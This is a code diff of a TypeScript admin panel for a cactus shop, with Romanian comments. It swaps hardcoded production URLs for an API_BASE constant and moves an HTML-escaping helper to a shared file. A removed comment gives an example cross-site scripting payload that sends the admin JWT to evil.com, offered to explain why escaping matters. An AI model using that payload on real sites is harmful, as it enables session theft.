@@ -26,20 +26,7 @@ function getAuthHeader() {
     return { 'Authorization': `Bearer ${localStorage.getItem('jwtToken')}` };
 }
 
-// --- UTILITARĂ ANTI-XSS ---
-// Scapă orice text introdus de utilizator înainte de a-l pune în innerHTML.
-// FĂRĂ asta, un client poate trimite o comandă cu nume precum:
-// <img src=x onerror="fetch('https://evil.com?t='+localStorage.jwtToken)">
-// și fură token-ul de admin data viitoare când verifici comenzile.
-function escapeHtml(unsafe: string | null | undefined): string {
-    if (unsafe === null || unsafe === undefined) return "";
-    return unsafe
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
-}
+// escapeHtml și API_BASE vin din shared.ts (încărcat înaintea acestui fișier în admin.html)
 
 // --- 1. SISTEMUL DE LOGIN ---
 const loginBtn = document.getElementById('login-btn');
@@ -49,7 +36,7 @@ if (loginBtn) {
         const passInput = (document.getElementById('admin-pass') as HTMLInputElement).value;
 
         try {
-            const response = await fetch('cactus-shop-production.up.railway.app/api/auth/login', {
+            const response = await fetch(`${API_BASE}/api/auth/login`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username: userInput, password: passInput })
@@ -78,7 +65,7 @@ if (loginBtn) {
 // --- 2. GESTIUNE CATEGORII ---
 async function fetchAdminCategories() {
     try {
-        const response = await fetch('cactus-shop-production.up.railway.app/api/categories');
+        const response = await fetch(`${API_BASE}/api/categories`);
         const categories: Category[] = await response.json();
 
         // A. Populează lista cu butoane de ștergere
@@ -96,7 +83,7 @@ async function fetchAdminCategories() {
                 btn.addEventListener('click', async (e) => {
                     const id = (e.target as HTMLButtonElement).getAttribute('data-id');
                     if (confirm("Sigur ștergi această categorie?")) {
-                        await fetch(`cactus-shop-production.up.railway.app/api/categories/${id}`, {
+                        await fetch(`${API_BASE}/api/categories/${id}`, {
                             method: 'DELETE',
                             headers: getAuthHeader()
                         });
@@ -123,7 +110,7 @@ if (addCategoryBtn) {
         const nameInput = document.getElementById('new-category-name') as HTMLInputElement;
         if (!nameInput.value.trim()) return;
 
-        await fetch('cactus-shop-production.up.railway.app/api/categories', {
+        await fetch(`${API_BASE}/api/categories`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json', ...getAuthHeader() },
             body: JSON.stringify({ name: nameInput.value.trim() })
@@ -137,7 +124,7 @@ if (addCategoryBtn) {
 // --- 3. GESTIUNE CACTUȘI (PRODUSE) ---
 async function fetchAdminCacti() {
     try {
-        const response = await fetch('cactus-shop-production.up.railway.app/api/cacti');
+        const response = await fetch(`${API_BASE}/api/cacti`);
         const cacti: Cactus[] = await response.json();
 
         const container = document.getElementById('admin-cacti-list');
@@ -166,7 +153,7 @@ async function fetchAdminCacti() {
                 const cactusId = Number(btn.getAttribute('data-id'));
 
                 if (confirm("Ești sigur că vrei să ștergi acest produs?")) {
-                    await fetch(`cactus-shop-production.up.railway.app/api/cacti/${cactusId}`, {
+                    await fetch(`${API_BASE}/api/cacti/${cactusId}`, {
                         method: 'DELETE',
                         headers: getAuthHeader()
                     });
@@ -196,7 +183,7 @@ if (addCactusBtn) {
             return;
         }
 
-        await fetch('cactus-shop-production.up.railway.app/api/cacti', {
+        await fetch(`${API_BASE}/api/cacti`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json', ...getAuthHeader() },
             body: JSON.stringify(newCactus)
@@ -215,7 +202,7 @@ if (addCactusBtn) {
 // --- 4. VIZUALIZARE COMENZI (necesită Auth) ---
 async function fetchAdminOrders() {
     try {
-        const response = await fetch('cactus-shop-production.up.railway.app/api/orders', {
+        const response = await fetch(`${API_BASE}/api/orders`, {
             headers: getAuthHeader()
         });
 
